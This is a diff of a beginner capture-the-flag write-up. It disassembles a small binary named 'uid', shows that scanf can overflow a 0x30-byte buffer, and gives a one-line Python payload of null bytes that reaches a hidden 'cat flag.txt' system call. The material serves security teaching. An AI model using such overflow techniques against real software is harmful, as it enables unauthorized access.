@@ -1,5 +1,7 @@
-objdump --disassemble=main -Mintel uid
+## Basic inspection
+This is an intro chall so let's dive directly into the asm.
 
+`objdump --disassemble=main -Mintel uid`:
 ```
 0000000000001175 <main>:
     1175:       55                      push   rbp
@@ -29,8 +31,8 @@ objdump --disassemble=main -Mintel uid
     11e2:       c9                      leave
     11e3:       c3                      ret
 ```
-the important:
 
+The important part is:
 ```
 ...
     1179:       48 83 ec 30             sub    rsp,0x30
@@ -48,13 +50,32 @@ the important:
     11d8:       e8 53 fe ff ff          call   1030 <system@plt>
 ...
 ```
-we learn that: the buffer is `0x30`
-we write into the buffer with scnaf 
-there is two call to system, because in local where flop.txt doesn't exists we get an error we guess that these
-calls are some `cat ...` which is confirmed by `strings uid`
-the first system call is conditional so this is the one we must pass in 
-we have to fill the buffer with null bytes
-solution:
+We learn that: 
+- the buffer is `0x30`  
+- we write into the buffer with `scanf` 
+- there is two call to system
+
+## Exploitation
+Let's execute the binary:
+```
+$ ./uid
+username: AAAA
+cat: flop.txt: No such file or directory
+```
+
+Because in local `flop.txt` doesn't exists we get an error but we guess that these `system` calls are some `cat ...` which is confirmed by `strings uid`:
+```
+...
+[]A\A]A^A_
+username:
+cat flag.txt
+cat flop.txt
+...
+```
+
+The first system call is conditional so this is the one we must reach!
+
+To do so, we have to fill the buffer with null bytes to satisfy the `cmp    DWORD PTR [rbp-0x4],0x0`.
+
+The simplest solution is then:  
 `python -c 'print("\x00"*0x30)' | ./uid`
-
-
